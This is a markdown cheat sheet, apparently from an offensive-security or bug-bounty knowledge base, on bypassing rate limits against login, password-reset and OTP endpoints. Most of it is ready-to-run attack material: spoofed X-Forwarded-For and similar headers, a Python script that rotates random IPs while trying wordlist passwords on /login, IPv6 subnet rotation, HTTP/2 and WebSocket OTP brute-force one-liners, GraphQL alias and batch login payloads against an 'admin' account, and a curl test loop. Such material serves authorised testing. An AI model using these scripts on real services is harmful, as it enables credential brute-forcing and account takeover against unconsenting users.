---
tags:
  - high
  - logic
---

# Rate Limit Bypass

Evade request throttling via IP spoofing headers, parameter manipulation, endpoint variations, or protocol abuse.

## TL;DR

```http
X-Forwarded-For: 127.0.0.1
X-Originating-IP: 1.2.3.4
# Or null byte in param: email=victim@test.com%00
```

## Detection

### Find Rate-Limited Endpoints
- Login, password reset, OTP verification
- API endpoints with quotas
- Account enumeration vectors

### Trigger & Analyze
1. Send requests until blocked
2. Note: threshold, window, response code
3. Check `X-RateLimit-*` headers, `Retry-After`
4. Is it IP-based? Session-based? Account-based?

## Exploitation

### IP-Based Bypass

**Header Spoofing:**
```http
X-Forwarded-For: 1.2.3.4
X-Originating-IP: 127.0.0.1
X-Remote-IP: 10.0.0.1
X-Client-IP: 172.16.0.1
True-Client-IP: 8.8.8.8
CF-Connecting-IP: 1.1.1.1

# Double header trick
X-Forwarded-For:
X-Forwarded-For: 127.0.0.1

# Space before colon (bypassed courier.app)
X-Forwarded-For : 1.2.3.4
```

**Rotation Script:**
```python
import random
for attempt in range(1000):
    ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
    headers = {'X-Forwarded-For': ip}
    requests.post('/login', headers=headers, data={'pass': wordlist[attempt]})
```

**IPv6 Subnet Abuse:**
```python
# Users get /64 subnets (18 quintillion addresses)
# Rate limiters often hardcode /128
import ipaddress
for ip in ipaddress.ip_network('2001:db8::/64').hosts():
    headers = {'X-Forwarded-For': str(ip)}
```

### Parameter Manipulation

**Null Byte Injection:**
```http
email=victim@email.com%00
email=victim@email.com%0a
email=victim@email.com%20
```

**Case/Encoding Tricks:**
```
email=VICTIM@email.com
email=victim@email%2Ecom
email=victim%40email.com
```

### HTTP/2 Multiplexing

Rate limiters often count TCP connections, not HTTP/2 streams:

```bash
seq 1 100 | xargs -I@ -P0 curl -k --http2-prior-knowledge \
    -X POST -d '{"code":"@"}' https://target/verify
```

### GraphQL Batching

**Alias Attack (single request, multiple operations):**
```graphql
mutation {
  a: login(username:"admin", password:"pass1") { token }
  b: login(username:"admin", password:"pass2") { token }
  c: login(username:"admin", password:"pass3") { token }
}
```

**Array Batching:**
```json
{"token": ["key1", "key2", "key3", ... "key100000"]}
```

### Endpoint Variations

```
/api/v1/login
/api/v2/login
/API/LOGIN
/api/v1/login/
/api/v1/login?dummy=1
```

**Method Switching:**
```http
POST /reset-password → GET /reset-password?email=victim@test.com
```

### WebSocket/gRPC Bypass

Rate limiters often only inspect initial HTTP:

```bash
# 1000 OTP guesses via single WebSocket
seq -w 000000 000999 | websocat -n ws://target/verify-ws
```

## Bypasses

### Keep Testing After Limit
```python
# Even if rate limited, valid OTP may return 200
for code in codes:
    resp = try_otp(code)
    if resp.status_code == 200:  # Not 429
        print(f"Valid: {code}")
```

### Sliding Window Timing
```
|<-- 60s window -->|<-- 60s window -->|
              ####|####
# Fire max requests just before reset, then immediately after
```

### REST Batch Endpoints
```json
POST /v2/batch
[
  {"path": "/login", "method": "POST", "body": {"pass":"123"}},
  {"path": "/login", "method": "POST", "body": {"pass":"456"}}
]
```

## Real Examples

| Target | Technique | Report |
|--------|-----------|--------|
| Snapchat | X-Forwarded-For | Multiple |
| Courier | Space before colon | #1206777 |
| HackerOne | Null byte injection | #170310 |
| Nextcloud | IPv6 /64 abuse | #1154003 |
| Shopify | GraphQL negative cost | #481518 |
| RubyGems | Token array batching | #1559262 |

## Tools

| Tool | Purpose |
|------|---------|
| **Burp IP Rotator** | AWS API Gateway IP rotation |
| **FireProx** | Disposable AWS endpoints |
| **Turbo Intruder** | HTTP/2 multiplexing |

**Quick Test:**
```bash
for i in {1..50}; do
    curl -s -X POST https://target/login \
        -H "X-Forwarded-For: 10.0.0.$i" \
        -d 'user=admin&pass=test' | grep -q "locked" || echo "Bypass at $i"
done
```
